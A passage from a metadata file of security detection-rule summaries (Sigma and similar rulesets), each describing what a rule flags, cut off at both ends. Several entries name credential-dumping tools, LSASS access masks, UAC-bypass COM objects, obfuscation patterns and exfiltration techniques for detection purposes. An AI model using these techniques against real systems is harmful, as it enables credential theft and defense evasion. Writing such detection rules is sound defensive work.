  Rule-Body-Hash: 18fe836af0aaf35c4a47634accbb0492
  Ruleset: core
  Summary: This rule detects Flash Player updates being downloaded from unofficial
    locations, particularly focusing on URLs containing '/flash_install.php' or ending
    with '/install_flash_player.exe', excluding those from the official Adobe domain
    ('.adobe.com'). This detection aims to identify potential malicious downloads
    that could be an attempt to disguise malware as legitimate Flash Player updates,
    which is a technique often used to gain initial access, execute attacks, and evade
    defenses.
  Updated-Date: '2024_09_03'
4931188c-178e-4ee7-a348-39e8a7a56821:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 6e4d7801672d1929c80446089581b229
  Ruleset: sigmahq
  Summary: This rule detects the activity of unloading a filter driver using fltmc.exe.
    It identifies instances where the process image ends with 'fltMC.exe' or is originally
    named 'fltMC.exe' and where the command line contains the term 'unload.' The rule
    includes optional filters to reduce false positives from specific applications
    such as Avira and ManageEngine. These filters check if the parent image path or
    command line corresponds to known legitimate activities related to these software
    solutions.
  Updated-Date: '2024_09_04'
49329257-089d-46e6-af37-4afce4290685:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b68a729d9f02def9ef7e4b6f390eb5a6
  Ruleset: core
  Summary: This rule detects the loading of EvtMuteHook.dll, which is a significant
    component of SharpEvtHook. SharpEvtHook is a tool utilized to manipulate Windows
    event logs, thereby evading defense mechanisms. The rule specifically identifies
    the presence of a known hash associated with EvtMuteHook.dll in the image load
    logs on Windows systems.
  Updated-Date: '2024_09_03'
493fb4ab-cdcc-4c4f-818c-0e363bd1e4bb:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 6fda5ddcc374fed157b1983ec28334f5
  Ruleset: sigmahq
  Summary: This rule detects the WMI Event Consumer service, scrcons.exe, creating
    a named pipe.
  Updated-Date: '2024_09_04'
496a0e47-0a33-4dca-b009-9e6ca3591f39:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 9dcd0c73bab45be78682f6bba982f33a
  Ruleset: sigmahq
  Summary: This rule detects suspicious service ticket requests using RC4 encryption
    type on Windows systems. Specifically, it monitors for Event ID 4769 where the
    ticket options contain '0x40810000' and the ticket encryption type is '0x17',
    indicating the use of RC4 encryption, which may suggest potential Kerberoasting
    attacks.
  Updated-Date: '2024_09_04'
4976aa50-8f41-45c6-8b15-ab3fc10e79ed:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c5283f5487e2c561c557d86f598bdef7
  Ruleset: core
  Summary: This rule detects the execution of well-known credential dumping tools
    through service execution events. Specifically, it monitors for instances in Windows
    environments where the 'Service Control Manager' provider logs Event ID 7045.
    The rule searches for the presence of certain tools such as 'cachedump,' 'dumpsvc,'
    'fgexec,' 'gsecdump,' 'mimidrv,' 'pwdump,' and 'servpw' in the image path. These
    tools are commonly used to extract password hashes and other sensitive credential
    information from the system.
  Updated-Date: '2024_09_03'
49a268a4-72f4-4e38-8a7b-885be690c5b5:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 58ee52f8e59d08ace1c08fb172de8147
  Ruleset: core
  Summary: This rule detects when a user is added to a privileged role within an Azure
    environment. The detection focuses on specific messages indicating the addition
    of either a permanent or eligible member to a privileged role. Such actions are
    significant as they can indicate attempts at privilege escalation or defense evasion,
    although legitimate administrator actions can also trigger this alert.
  Updated-Date: '2024_09_03'
49aae26c-450e-448b-911d-b3c13d178dfc:
  Created-Date: '2024_08_06'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1bf9fd6bb019634eb54396a95912863a
  Ruleset: core
  Summary: This rule detects attempts to enable auditing of TTY (teletypewriter) input
    on Linux systems. It monitors changes to specific configuration files such as
    `/etc/pam.d/system-auth` and `/etc/pam.d/password-auth`, which are integral to
    the Pluggable Authentication Modules (PAM) system used for authentication tasks.
    The detection also focuses on identifying events related to TTY, which handles
    terminal input, and USER_TTY activities. This can potentially indicate the use
    of keylogging techniques aimed at capturing user credentials and other sensitive
    input within terminal sessions.
  Updated-Date: '2024_09_03'
49be8799-7b4d-4fda-ad23-cafbefdebbc5:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b92fd5a120812e73e328f4aede015c6b
  Ruleset: sigmahq
  Summary: This rule detects the execution of "wfc.exe," which is the Workflow Command-line
    Compiler. "Wfc.exe" can be used for Application Whitelisting (AWL) bypass techniques,
    making it a potential tool for malicious activities. Microsoft recommends blocking
    this executable as part of their security guidelines.
  Updated-Date: '2024_09_04'
49d9671b-0a0a-4c09-8280-d215bfd30662:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: fcc6062dbc7177f6cac8313b942fc34e
  Ruleset: sigmahq
  Summary: This rule detects attempts to terminate an application via the Windows
    Management Instrumentation Command-line (WMIC) utility. It specifically looks
    for calls made to the "terminate" function using WMIC.exe, which could indicate
    a potentially malicious activity such as the unauthorized killing of processes.
    The rule captures the process creation events where WMIC.exe is involved and the
    command line includes both 'call' and 'terminate' arguments. This behavior is
    often associated with advanced malware and threats like ransomware, which use
    such techniques to disable security mechanisms or other software.
  Updated-Date: '2024_09_04'
49e5bc24-8b86-49f1-b743-535f332c2856:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 5381dd2eeb18807514acb171b309b887
  Ruleset: core
  Summary: This rule detects attempts blocked by Microsoft Defender's Tamper Protection
    feature that try to alter Defender's settings such as "Real Time Monitoring" and
    "Behavior Monitoring". When Tamper Protection is enabled, any attempt to modify
    these settings is prevented, generating an Event ID 5013, which identifies which
    specific setting change was blocked.
  Updated-Date: '2024_09_03'
49f2f17b-b4c8-4172-a68b-d5bf95d05130:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 02132023388e44b846d289db9a170775
  Ruleset: core
  Summary: This rule detects the pattern of User Account Control (UAC) bypass through
    the use of the ICMLuaUtil Elevated COM interface. It identifies when the parent
    process is `dllhost.exe` and the command line contains specific Process IDs, indicating
    an attempt to elevate privileges by bypassing UAC. The rule specifically filters
    out instances where the process image ends with `WerFault.exe` and the original
    file name matches `WerFault.exe` to reduce false positives.
  Updated-Date: '2024_09_03'
49f5dfc1-f92e-4d34-96fa-feba3f6acf36:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: fc9e0c332ccc3b99f8be038a38f307e5
  Ruleset: sigmahq
  Summary: This rule detects attempts to disable security tools on Linux systems by
    monitoring syslog entries for specific keywords. These keywords include indications
    of stopping services such as iptables, ip6tables, firewalld, cbdaemon, and falcon-sensor.
    Detecting these actions may indicate an effort to evade defenses and compromise
    the system's security. Legitimate administrative tasks may sometimes trigger these
    detections.
  Updated-Date: '2024_09_04'
4a0b2c7e-7cb2-495d-8b63-5f268e7bfd67:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 9deb6cbdbb710b43ed384b7e6bc191b2
  Ruleset: core
  Summary: This rule detects the execution of a renamed ProcDump executable, a common
    technique used by attackers or malware to evade defensive mechanisms. ProcDump
    is typically used for creating crash dumps and can be exploited for malicious
    purposes if renamed. Detection criteria include the original file name 'procdump'
    and command line flags associated with ProcDump behavior, while excluding known
    legitimate instances based on file paths. Potential false positives include legitimate
    software bundling or administratively renamed binaries.
  Updated-Date: '2024_09_03'
4a1b6da0-d94f-4fc3-98fc-2d9cb9e5ee76:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: da7fd13a1d8b24770cbc714b5f221110
  Ruleset: sigmahq
  Summary: This rule detects potentially suspicious access requests to the LSASS (Local
    Security Authority Subsystem Service) process in Windows systems. Specifically,
    it looks for process handle requests with certain access masks or attempts to
    access LSASS objects. The rule identifies EventID 4656, which indicates a handle
    to an object was requested, and EventID 4663, which signifies an attempt to access
    an object. The access masks in question include various hexadecimal values such
    as "0x40", "0x1400", and "0x100000", among others. It filters out numerous legitimate
    processes, such as those belonging to security software like Microsoft Defender,
    process monitoring tools like ProcMon, and system processes like "csrss.exe" and
    "taskmgr.exe", to reduce false positives.
  Updated-Date: '2024_09_04'
4a241dea-235b-4a7e-8d76-50d817b146c4:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 039e1e862cdbe2f5efe561e5b8880ff3
  Ruleset: core
  Summary: This rule detects the use of the PowerShell cmdlet `New-MailboxExportRequest`
    to export a mailbox to a remote or local share. This behavior is often observed
    in exploitations related to ProxyShell vulnerabilities in Microsoft Exchange Server,
    which can be indicative of an exfiltration attempt. This activity requires Script
    Block Logging to be enabled on Windows systems to capture the necessary data for
    detection.
  Updated-Date: '2024_09_03'
4a2a2c3e-209f-4d01-b513-4155a540b469:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e8cb3d1e698a75169f36a18c394edb6b
  Ruleset: sigmahq
  Summary: This rule detects the suspicious use of msiexec.exe embedding, which adversaries
    may exploit to execute malicious payloads indirectly. It monitors for instances
    where PowerShell, pwsh, or cmd.exe are initiated with msiexec.exe as the parent
    process and include the '-Embedding' parameter. The rule includes filters to exclude
    benign activities related to specific system and software processes, such as SplunkUniversalForwarder
    and certain DismFoDInstall operations. This approach aims to identify potential
    misuse of msiexec.exe for evading defenses and executing unauthorized actions.
  Updated-Date: '2024_09_04'
4a30ac0c-b9d6-4e01-b71a-5f851bbf4259:
  Created-Date: '2024_09_03'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 25df9f3b1ff22355cd44494593a27dac
  Ruleset: core
  Summary: This rule detects the usage of emojis in the command line, which could
    indicate potential defense evasion activities by threat actors who embed emojis
    to bypass security monitoring tools.
  Updated-Date: '2024_09_03'
4a5f5a5e-ac01-474b-9b4e-d61298c9df1d:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 35da8e7bcb8487ae8bf3d7e1b6e28ffe
  Ruleset: core
  Summary: This rule detects instances where PowerShell code is written into the Windows
    registry as a service. Specifically, it monitors registry entries that include
    paths ending in '\Services\' and '\ImagePath', combined with the presence of terms
    like 'powershell' or 'pwsh' in the details. This behavior is indicative of a setup
    where PowerShell scripts are configured to run as services, which may be utilized
    for malicious purposes such as persistence or automated execution of tasks.
  Updated-Date: '2024_09_03'
4a6713f6-3331-11ed-a261-0242ac120002:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d88bd3dfb61bd861bb61fd852f2b83ff
  Ruleset: core
  Summary: This rule detects attempts to disable Symantec Endpoint Protection through
    the misuse of the taskkill command. Specifically, it identifies instances where
    the NT AUTHORITY/SYSTEM user executes the taskkill command to forcefully terminate
    the 'ccSvcHst.exe' process, which is essential for the antivirus service. This
    action effectively shuts down Symantec Endpoint Protection, exploiting a vulnerability
    in the implementation of its protected service mechanism.
  Updated-Date: '2024_09_03'
4aa6040b-3f28-44e3-a769-9208e5feb5ec:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d16599eacc9288b74a8d2a9f69318916
  Ruleset: core
  Summary: This rule detects the execution of Rundll32.exe when DLL files are cloaked
    as image files. It identifies instances where the process creation log involves
    Rundll32.exe and the associated DLL files have misleading image file extensions
    such as .bmp, .cr2, .eps, .gif, .ico, .jpeg, .jpg, .nef, .orf, .png, .raw, .sr2,
    .tif, or .tiff. This behavior can indicate an attempt to evade defenses by using
    legitimate processes to run malicious code, leveraging the common practice of
    masquerading DLL files as images.
  Updated-Date: '2024_09_03'
4aafb0fa-bff5-4b9d-b99e-8093e659c65f:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c3e553028e0eab7401f0e26229222140
  Ruleset: sigmahq
  Summary: This rule detects interactions with a remote network share using Server
    Message Block (SMB), a technique often employed by post-exploitation frameworks
    for lateral movement. It specifically monitors for file events on Windows systems
    targeting filenames that contain the patterns '\\\\127.0.0' and '\ADMIN$\' to
    identify potential unauthorized use.
  Updated-Date: '2024_09_04'
4abc0ec4-db5a-412f-9632-26659cddf145:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 547a64f5b71515acded4218cde5d492e
  Ruleset: core
  Summary: This rule detects the execution of the binary "wpbbin.exe," commonly used
    in a UEFI-based persistence method. UEFI (Unified Extensible Firmware Interface)
    persistence allows malware to remain on a system even after operating system reinstallation
    or hard drive replacement. The binary is associated with advanced persistence
    techniques and may be used in unauthorized activities aiming at maintaining long-term
    access to a compromised system. There can be legitimate usage of this file by
    hardware manufacturers like Lenovo.
  Updated-Date: '2024_09_03'
4ac1f50b-3bd0-4968-902d-868b4647937e:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a4fb026c781fa7e90e35512ba34a186e
  Ruleset: core
  Summary: This rule detects attempts to extract the Data Protection Application Programming
    Interface (DPAPI) domain backup key from Domain Controllers using tools. The detection
    focuses on Event ID 4662 where the ObjectType is 'SecretObject', the AccessMask
    is '0x2', and the ObjectName contains 'BCKUPKEY'. This type of activity is associated
    with credential access attacks, particularly under the tactic of accessing Local
    Security Authority (LSA) secrets.
  Updated-Date: '2024_09_03'
4ac47ed3-44c2-4b1f-9d51-bf46e8914126:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1f888dcfa03ea6379ce9e5fa5e0017d3
  Ruleset: core
  Summary: This rule detects indicators of a User Account Control (UAC) bypass method
    by monitoring for processes that mock trusted directories, specifically targeting
    the directory path 'C:\Windows\System32\'. This detection method helps identify
    potential unauthorized attempts to escalate privileges by exploiting trusted system
    paths.
  Updated-Date: '2024_09_03'
4ac5fc44-a601-4c06-955b-309df8c4e9d4:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 28e286c1df429a8f26aeccd1a2574bb6
  Ruleset: emerging-threats
  Summary: This rule detects specific registry keys that are associated with OceanLotus
    (also known as APT32) attacks. OceanLotus is a sophisticated cyber-espionage group
    known for targeting various sectors. The detection targets registry entries within
    Windows systems that reflect patterns commonly associated with OceanLotus malware
    activity, specifically within the CLSID, HKCU, and AppX registry paths. The presence
    of these particular registry keys can indicate attempts at defense evasion and
    other malicious activities tied to OceanLotus.
  Updated-Date: '2024_09_03'
4ad97bf5-a514-41a4-abd3-4f3455ad4865:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c89892f9f1b1c0e04f35deff7b888717
  Ruleset: sigmahq
  Summary: This rule detects guest users being invited to a tenant by non-approved
    inviters within Azure audit logs under the 'UserManagement' category when the
    operation name is 'Invite external user'. It triggers if the inviter is not listed
    as an approved guest inviter.
  Updated-Date: '2024_09_04'
4ae3e30b-b03f-43aa-87e3-b622f4048eed:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 473403f892a9ecb0d2475f1aa3144edf
  Ruleset: core
  Summary: This rule detects potential arbitrary file downloads being initiated through
    Microsoft Office applications such as Excel, PowerPoint, and Word. It identifies
    these activities by monitoring process creation events for specific Office application
    executables and checking if command lines include HTTP or HTTPS URLs, which are
    indicative of attempts to download files from the internet. This type of activity
    may be associated with defense evasion techniques and poses a high-security risk.
  Updated-Date: '2024_09_03'
4ae81040-fc1c-4249-bfa3-938d260214d9:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1a8338aa0e83bbf2e3b9a6b479f5fb1c
  Ruleset: sigmahq
  Summary: This rule detects the use of the icacls utility to deny access for everyone
    to a specific folder in the Users directory on Windows systems. Icacls is a built-in
    command-line utility used to modify file and directory permissions. Malicious
    actors may misuse icacls to hide malicious files by setting permissions that prevent
    any user from accessing the folder. The rule specifically looks for command-line
    entries and process creations involving icacls.exe with parameters that indicate
    permission denial. This behavior falls under the defense evasion tactic, aiming
    to obscure or protect malicious files from being detected or removed.
  Updated-Date: '2024_09_04'
4afac85c-224a-4dd7-b1af-8da40e1c60bd:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 09136674187ef374d90e5aa8033fe5eb
  Ruleset: sigmahq
  Summary: This rule detects attempts to log in using an account that has been disabled
    or blocked for sign-in within Azure services. It identifies such attempts by monitoring
    login failure events detailed with a specific result type and description. Possible
    false positives include scenarios where accounts have been disabled or blocked
    unintentionally or where automation accounts are involved.
  Updated-Date: '2024_09_04'
4b046706-5789-4673-b111-66f25fe99534:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 091306e3a39d8ac0317962675098b711
  Ruleset: sigmahq
  Summary: This rule detects the use of the "cipher" utility in Windows to overwrite
    deleted data on a disk. Adversaries exploit this built-in tool to destroy data
    and files either on specific systems or across networks, aiming to disrupt the
    availability of systems, services, and network resources. Such data destruction
    efforts make the data irrecoverable by forensic methods by overwriting files or
    data on both local and remote drives.
  Updated-Date: '2024_09_04'
4b09c71e-4269-4111-9cdd-107d8867f0cc:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 001d3ecfe41af9bc270318929f35ce76
  Ruleset: sigmahq
  Summary: This rule detects the use of the "flock" command to execute a shell in
    Linux environments. The "flock" command can potentially be used for privilege
    escalation, unauthorized command execution, or escaping restricted environments.
    The detection focuses on process creation events, specifically looking for the
    execution of shell commands such as '/bin/bash', '/bin/dash', '/bin/fish', '/bin/sh',
    and '/bin/zsh' following the "flock" command. This behavior is commonly associated
    with techniques to break out from restricted shells or environments, which can
    be a significant security concern.
  Updated-Date: '2024_09_04'
4b13db67-0c45-40f1-aba8-66a1a7198a1e:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 19c444c39caa9541ae099b22b119350f
  Ruleset: sigmahq
  Summary: This rule detects the usage of extrac32.exe to extract data from a .cab
    file and hide it in an alternate data stream. This behavior is associated with
    defense evasion techniques in which malicious actors use alternate data streams
    to hide their activities or payloads within a file system. The rule specifically
    looks for command lines that invoke extrac32.exe with a .cab file and include
    a syntax pattern indicating the use of an alternate data stream.
  Updated-Date: '2024_09_04'
4b3cb710-5e83-4715-8c45-8b2b5b3e5751:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 49663caec8f0658f43df9c9bac264e61
  Ruleset: core
  Summary: This rule detects the modification of the `/etc/ld.so.preload` file on
    Linux systems, which is commonly used by attackers for shared object injection.
    This technique allows the injection of arbitrary code into processes, enabling
    attackers to execute malicious actions within those processes, potentially bypassing
    security mechanisms.
  Updated-Date: '2024_09_03'
4b60e6f2-bf39-47b4-b4ea-398e33cfe253:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ce0d603663ae39b2fc61a5f786b46b55
  Ruleset: core
  Summary: This rule detects attempts to bypass User Account Control (UAC) by exploiting
    the Microsoft Connection Manager Profile Installer, known as CMSTP, via auto-elevate-capable
    COM objects. The detection parameters include monitoring for specific patterns
    in process creation where the parent process is `DllHost.exe` and command line
    arguments indicate the use of certain COM objects associated with UAC bypass techniques.
    These objects include those identified by UACMe with IDs 41, 43, 58, or 65, such
    as `cmstplua.dll`, `CMLUAUTIL`, `EditionUpgradeManagerObj.dll`, `colorui.dll`,
    and `wscui.cpl`. The rule also checks for processes with high or system integrity
    levels, suggesting elevated privileges. Identified instances may indicate malicious
    activity unless they reflect legitimate CMSTP usage, which is rare in modern enterprise
    environments.
  Updated-Date: '2024_09_03'
4b657234-038e-4ad5-997c-4be42340bce4:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 7942679cfbce28a708e14cd3ca7b13aa
  Ruleset: sigmahq
  Summary: This rule detects network connections to Visual Studio Code tunnel domains
    initiated by a process on a system. Attackers can exploit this feature to establish
    a reverse shell or maintain persistence on the machine. The detection focuses
    on network connections where the destination hostname ends with '.tunnels.api.visualstudio.com'.
    While legitimate use of Visual Studio Code tunnels will also trigger this rule,
    it primarily aims to identify potential unauthorized activities indicative of
    exfiltration attempts.
  Updated-Date: '2024_09_04'
4b89abaa-99fe-4232-afdd-8f9aa4d20382:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d79514fae7cc288c304b84ec4d6d7882
  Ruleset: core
  Summary: This rule detects programs establishing connections to known malware callback
    ports identified through statistical analysis of two different sandbox system
    databases. Specifically, it monitors for network connection activities initiated
    on various ports that have been associated with malware communication. The detection
    filters out connections to local addresses and common system directories to reduce
    false positives. Potential false positives are generally unknown and require further
    analysis.
  Updated-Date: '2024_09_03'
4b991083-3d0e-44ce-8fc4-b254025d8d4b:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: dc9c83c903577c4b1a18fa9655f6f2ba
  Ruleset: sigmahq
  Summary: This rule detects instances where the command interpreter (cmd.exe) is
    launched by an unusual or suspicious parent process. Specifically, it monitors
    for cmd.exe processes that are initiated by parent processes such as csrss.exe,
    ctfmon.exe, dllhost.exe, epad.exe, FlashPlayerUpdateService.exe, GoogleUpdate.exe,
    jucheck.exe, jusched.exe, LogonUI.exe, lsass.exe, regsvr32.exe, SearchIndexer.exe,
    SearchProtocolHost.exe, SIHClient.exe, sihost.exe, slui.exe, spoolsv.exe, sppsvc.exe,
    taskhostw.exe, unsecapp.exe, WerFault.exe, wermgr.exe, wlanext.exe, and WUDFHost.exe.
    The presence of cmd.exe with these parent processes may indicate potentially malicious
    activity and warrant further investigation.
  Updated-Date: '2024_09_04'
4bb79b62-ef12-4861-981d-2aab43fab642:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 4f852be72057b194e4ce157c76aaeb9d
  Ruleset: sigmahq
  Summary: This rule detects the installation of a TacticalRMM service. TacticalRMM
    is a remote monitoring and management tool. The detection is based on events logged
    by the Service Control Manager in Windows, specifically looking for instances
    where the ImagePath contains 'tacticalrmm.exe' or the ServiceName includes 'TacticalRMM
    Agent Service'. The rule aims to identify potentially unauthorized deployments
    of this tool, although legitimate use cases may also trigger it.
  Updated-Date: '2024_09_04'
4bb80281-3756-4ec8-a88e-523c5a6fda9e:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c3237821d79af0d9684e572ca0a85b69
  Ruleset: sigmahq
  Summary: This rule detects the addition of a new root certificate authority to an
    AzureAD tenant, which is used to support certificate-based authentication. The
    detection focuses on identifying operations where company information is set,
    specifically looking for modifications that include new values related to 'TrustedCAsForPasswordlessAuth'.
    This activity can be associated with persistence and privilege escalation tactics.
  Updated-Date: '2024_09_04'
4be8b654-0c01-4c9d-a10c-6b28467fc651:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 520639f5f2a626e3de0d0954b34462d2
  Ruleset: core
  Summary: This rule detects potentially unauthorized memory dumps of the LSASS (Local
    Security Authority Subsystem Service) process, which is critical for managing
    Windows credential information. The rule identifies instances where processes
    use commonly white-listed filenames, such as TrolleyExpress.exe, ProcessDump.exe,
    or dump64.exe, to avoid detection by security tools like Microsoft Defender. These
    filenames are often associated with legitimate software, such as Citrix and Cisco
    Jabber, but may be exploited to perform malicious credential dumping. The detection
    is based on specific access rights granted to these processes, which could indicate
    an attempt to extract sensitive information from the LSASS memory.
  Updated-Date: '2024_09_03'
4beb6ae0-f85b-41e2-8f18-8668abc8af78:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 649bce01b1685099b222e059d2fd55d0
  Ruleset: core
  Summary: This rule detects the suspicious execution of Sysinternals PsSuspend, a
    utility used to suspend processes on Windows systems. Specifically, the rule targets
    instances where PsSuspend is used to suspend critical processes such as antivirus
    (AV) or endpoint detection and response (EDR) processes, which could indicate
    an attempt to bypass security defenses.
  Updated-Date: '2024_09_03'
4bf943c6-5146-4273-98dd-e958fd1e3abf:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 65e5b5524697c28a0d150fe508b5c5ba
  Ruleset: core
  Summary: This rule detects various forms of obfuscated PowerShell IEX invocation
    code that are generated by the Invoke-Obfuscation framework. It identifies specific
    patterns in command lines, such as manipulations involving `$PSHome`, `$ShellId`,
    `$env:Public`, and `$env:ComSpec` variables, as well as certain expressions like
    `*mdr* )\.Name`, `$VerbosePreference.ToString()`, and `[String] $VerbosePreference`.
    This is intended to capture techniques used to obscure the execution of malicious
    scripts on Windows systems for evasion and execution purposes.
  Updated-Date: '2024_09_03'
4c0aaedc-154c-4427-ada0-d80ef9c9deb6:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 4423fa584e3bf526a0e36bba48c5240f
  Ruleset: core
  Summary: This rule detects the potential misuse of the Citrix TrolleyExpress.exe
    filename to perform a process memory dump on the lsass.exe process, which stores
    critical credential information. The detection is based on specific command line
    patterns and process image names, filtering out legitimate Citrix processes. This
    technique may be employed by attackers for credential dumping or data exfiltration
    by impersonating a trusted application.
  Updated-Date: '2024_09_03'
4c198a60-7d05-4daf-8bf7-4136fb6f5c62:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 51bd176d79154bf2fe602bd9af748acf
  Ruleset: emerging-threats
  Summary: This rule detects file modifications to ASHX and ASPX files within the
    root of the App_Extensions directory, which indicates the exploitation of the
    CVE-2024-1708 vulnerability. This vulnerability, present in versions prior to
    23.9.8 of ScreenConnect, is a ZipSlip vulnerability allowing unauthorized file
    modifications. The rule requires an Advanced Auditing policy to log successful
    Windows Event ID 4663 events and a System Access Control List (SACL) set on the
    directory.
  Updated-Date: '2024_09_03'
4c21b805-4dd7-469f-b47d-7383a8fcb437:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 0984e3da6b87ab9c5059dc81a55cb29f
  Ruleset: core
  Summary: This rule detects potential DLL sideloading involving the file "iviewers.dll,"
    which is associated with the OLE/COM Object Interface Viewer. It identifies instances
    where "iviewers.dll" is loaded, excluding cases where the file is part of the
    standard directories for Windows Kits. The purpose is to uncover potential defense
    evasion or privilege escalation, particularly activities related to the use of
    ShadowPad malware.
  Updated-Date: '2024_09_03'
4c4af3cd-2115-479c-8193-6b8bfce9001c:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2d7f479e48a802a5a9cbf1777ba47660
  Ruleset: sigmahq
  Summary: This rule detects attempts at data exfiltration using ICMP over PowerShell
    by monitoring for specific script block patterns indicative of such activity.
    It identifies the creation of objects using the `New-Object` command, the use
    of the `System.Net.NetworkInformation.Ping` class, and the invocation of the `.Send(`
    method, all of which are techniques that adversaries may employ to exfiltrate
    data over ICMP.
  Updated-Date: '2024_09_04'
4c54ba8f-73d2-4d40-8890-d9cf1dca3d30:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 8da88ac15a6fb78a914700bfe1a9a069
  Ruleset: core
  Summary: This rule detects obfuscated PowerShell scripts using the "VAR++ LAUNCHER"
    technique, triggering on Windows Security Event ID 4697. It identifies attempts
    where the PowerShell script includes specific patterns and arguments within the
    ServiceFileName, such as '&&set', 'cmd', '/c', and '-f'. Additionally, it looks
    for obfuscated variable references like '{0}', '{1}', '{2}', '{3}', '{4}', and
    '{5}' to identify obfuscation tactics often used to evade detection. This method
    is commonly associated with defense evasion and script execution attacks.
  Updated-Date: '2024_09_03'
4c6ca276-d4d0-4a8c-9e4c-d69832f8671f:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a8ad135cfbea45d9bc89dc2be22bb51a
  Ruleset: core
  Summary: This rule detects a highly relevant antivirus alert that reports known
    ransomware threats such as BlackWorm, Crypter, CRYPTES, Cryptor, Destructor, Filecoder,
    GandCrab, GrandCrab, Krypt, Locker, Phobos, Ransom, Ryuk, Ryzerlo, Tescrypt, and
    TeslaCrypt. The rule identifies the presence of these ransomware signatures, signaling
    a critical security incident.
  Updated-Date: '2024_09_03'
4c7f49ee-2638-43bb-b85b-ce676c30b260:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 805767913f7e261755d3f4a97fd65b12
  Ruleset: sigmahq
  Summary: This rule detects the creation of new DLL assembly files by "aspnet_compiler.exe",
    which could indicate the abuse of "aspnet_compiler" to proxy execution through
    a build provider. The focus is on identifying DLLs generated within specific temporary
    ASP.NET file paths, suggesting potential malicious activity leveraging the compiler.
  Updated-Date: '2024_09_04'
4c9d903d-4939-4094-ade0-3cb748f4d7da:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 60a734f18e0803b1b15375b4353c03cb
  Ruleset: sigmahq
  Summary: This rule detects an exploitation attempt targeting SSH servers using public
    exploit code for CVE-2018-15473. It identifies specific error messages in the
    SSH daemon logs that indicate an attacker is attempting to exploit this vulnerability.
  Updated-Date: '2024_09_04'
4cad6c64-d6df-42d6-8dae-eb78defdc415:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: eefc430b95ff31e04307986873b940af
  Ruleset: sigmahq
  Summary: This rule detects the injection of code by overwriting the memory map of
